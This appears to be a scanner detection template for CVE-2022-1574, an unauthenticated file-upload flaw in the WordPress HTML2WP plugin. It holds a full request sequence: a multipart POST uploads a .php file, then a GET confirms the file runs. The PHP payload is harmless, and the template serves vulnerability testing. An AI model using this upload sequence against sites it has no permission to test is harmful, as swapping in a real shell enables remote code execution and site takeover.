id: CVE-2022-1574
info:
  name: WordPress HTML2WP <=1.0.0 - Arbitrary File Upload
  author: theamanrawat
  description: 'WordPress HTML2WP plugin through 1.0.0 contains an arbitrary file
    upload vulnerability. The plugin does not perform authorization and CSRF checks
    when importing files and does not validate them. As a result, an attacker can
    upload arbitrary files on the remote server.

    '
  severity: critical
  impact: 'An attacker can upload malicious files to the server, leading to remote
    code execution or unauthorized access.

    '
  remediation: 'Update to the latest version of the plugin or remove it if not needed.

    '
  reference:
  - https://wpscan.com/vulnerability/c36d0ea8-bf5c-4af9-bd3d-911eb02adc14
  - https://wordpress.org/plugins/html2wp/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-1574
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-1574
    cwe-id: CWE-352
    epss-score: 0.03019
    epss-percentile: 0.90712
    cpe: cpe:2.3:a:html2wp_project:html2wp:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: html2wp_project
    product: html2wp
    framework: wordpress
  tags: cve,cve2022,wp-plugin,wp,fileupload,unauth,wpscan,wordpress,intrusive,html2wp,html2wp_project
traps:
- request:
    method: POST
    path: /wp-admin/admin.php?page=html2wp-settings
    headers:
      Content-Length: '253'
      Content-Type: multipart/form-data; boundary=---------------------------7816508136577551742878603990
      Connection: close
    body: |
      -----------------------------7816508136577551742878603990
      Content-Disposition: form-data; name="local_importing[]"; filename="{{randstr}}.php"
      Content-Type: text/html

      <?php

      echo "File Upload success";

      -----------------------------7816508136577551742878603990--
  response:
    status_code: 302
    headers: {}
    body: ''
- request:
    method: GET
    path: /wp-content/uploads/html2wp/.php
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: File Upload success
